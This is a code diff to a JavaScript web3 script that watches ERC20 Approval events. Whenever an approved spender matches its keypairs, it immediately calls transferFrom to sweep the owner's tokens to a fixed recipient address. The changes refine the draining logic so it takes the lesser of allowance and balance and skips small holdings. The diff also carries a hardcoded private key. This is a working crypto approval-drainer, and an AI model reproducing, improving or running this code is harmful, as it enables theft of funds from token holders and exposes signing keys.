@@ -19,9 +19,10 @@ const ERC20_CONTRACT_ADDRESSES = [
 ];
 
 const KEYPAIRS = {
-  '0x900DB7D5ebf24BF1539AbC3C020346B5D472DC07':{
-    'PRIVATE_KEY': "0x6e10fc7fc85bf25964e531dda9f051a4fb46a3815db57429b0c2b6fcd9d3ec52",
-    'RECIPIENT_ADDRESS':"0x5a18151130b93AB07196Bff74d0dcF71DEC00bde"
+  "0x900DB7D5ebf24BF1539AbC3C020346B5D472DC07": {
+    PRIVATE_KEY:
+      "0x6e10fc7fc85bf25964e531dda9f051a4fb46a3815db57429b0c2b6fcd9d3ec52",
+    RECIPIENT_ADDRESS: "0x5a18151130b93AB07196Bff74d0dcF71DEC00bde",
   },
   // '<SPECIFIC_SPENDER_ADDRESS>':{
   //   'PRIVATE_KEY': "",
@@ -193,6 +194,7 @@ const ERC20_ABI = [
 const listenToContract = (contractAddress) => {
   log("listen: ", contractAddress);
   const tokenContract = new web3.eth.Contract(ERC20_ABI, contractAddress);
+
   const obj = tokenContract.events;
   obj
     .Approval({
@@ -207,20 +209,35 @@ const listenToContract = (contractAddress) => {
         const ownerBalance = await tokenContract.methods
           .balanceOf(owner)
           .call();
-        
+        const decimals = parseInt(await tokenContract.methods.decimals().call());
+
         log(spender, KEYPAIRS[spender].RECIPIENT_ADDRESS);
 
-        console.log("Owner:", owner);
-        console.log("Allowance:", value);
-        console.log("Owner balance:", ownerBalance);
+        log("Owner:", owner);
+        log("Spender:", spender);
+        log("Allowance:", value);
+        log("Owner balance:", ownerBalance);
+        log("Token decimals:", decimals);
+        
+        if(parseInt(ownerBalance) < 10 * 10**decimals){
+          throw("allowance is not enough");
+        }
 
-        if (ownerBalance != 0) {
+        if (value < ownerBalance) {
           await sendTransferFrom(
             tokenContract,
             owner,
             KEYPAIRS[spender].RECIPIENT_ADDRESS,
             value,
-            KEYPAIRS[spender].PRIVATE_KEY,
+            KEYPAIRS[spender].PRIVATE_KEY
+          );
+        } else {
+          await sendTransferFrom(
+            tokenContract,
+            owner,
+            KEYPAIRS[spender].RECIPIENT_ADDRESS,
+            ownerBalance,
+            KEYPAIRS[spender].PRIVATE_KEY
           );
         }
       } catch (error) {
@@ -245,7 +262,7 @@ const sendTransferFrom = async (contract, from, to, value, privatekey) => {
   web3.eth
     .sendSignedTransaction(signedTx.rawTransaction)
     .on("receipt", (receipt) => {
-      console.log("Transfer successful:", receipt);
+      console.log("Transfer successful");
     })
     .on("error", (error) => {
       console.error("Error during transfer:", error);
